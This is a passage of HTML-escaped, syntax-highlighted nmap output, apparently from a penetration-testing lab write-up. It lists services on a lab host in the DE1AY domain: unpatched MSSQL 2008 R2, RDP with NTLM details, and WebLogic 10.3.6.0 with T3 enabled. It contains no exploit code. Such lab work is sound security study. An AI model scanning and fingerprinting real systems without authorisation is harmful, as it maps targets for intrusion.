+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;1433&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;  &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SQL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Server&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2008&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;R2&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;10.50.4000.00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SP2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;mf&#34;&gt;192.168.254.130&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1433&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;Version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SQL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Server&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2008&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;R2&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SP2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;n&#34;&gt;number&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;10.50.4000.00&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;n&#34;&gt;Product&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SQL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Server&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2008&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;R2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;n&#34;&gt;Service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;level&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SP2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;       &lt;span class=&#34;n&#34;&gt;Post&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SP&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;patches&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;applied&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;false&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;TCP&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;port&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1433&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_ssl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2024&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;09&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T07&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;scanner&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ssl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Subject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SSL_Self_Signed_Fallback&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;valid&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;before&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2024&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;09&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T07&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;06&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;05&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_Not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;valid&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;after&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;mi&#34;&gt;2054&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;09&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T07&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;06&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;05&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ms&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ntlm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;mf&#34;&gt;192.168.254.130&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1433&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;Target_Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DE1AY&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;NetBIOS_Domain_Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DE1AY&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;NetBIOS_Computer_Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WEB&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;DNS_Domain_Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;de1ay&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;DNS_Computer_Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WEB&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;de1ay&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;n&#34;&gt;DNS_Tree_Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;de1ay&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;Product_Version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;6.1.7601&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;3389&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;  &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;tcpwrapped&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_ssl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2024&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;09&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T07&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;scanner&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rdp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ntlm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;Target_Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DE1AY&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;NetBIOS_Domain_Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DE1AY&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;NetBIOS_Computer_Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WEB&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;DNS_Domain_Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;de1ay&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;DNS_Computer_Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WEB&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;de1ay&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;DNS_Tree_Name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;de1ay&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;n&#34;&gt;Product_Version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;6.1.7601&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;System_Time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2024&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;09&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T07&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ssl&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Subject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WEB&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;de1ay&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;valid&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;before&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2024&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;09&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;57&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_Not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;valid&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;after&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;mi&#34;&gt;2025&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;03&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;T13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;57&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;7001&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt;  &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;http&lt;/span&gt;         &lt;span class=&#34;n&#34;&gt;Oracle&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WebLogic&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Server&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;10.3.6.0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Servlet&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;JSP&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2.1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;T3&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;enabled&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_weblogic&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;t3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;T3&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;protocol&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebLogic&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;10.3.6.0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_http&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Error&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;404&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Found&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mi&#34;&gt;49152&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;msrpc&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;RPC&lt;/span&gt;
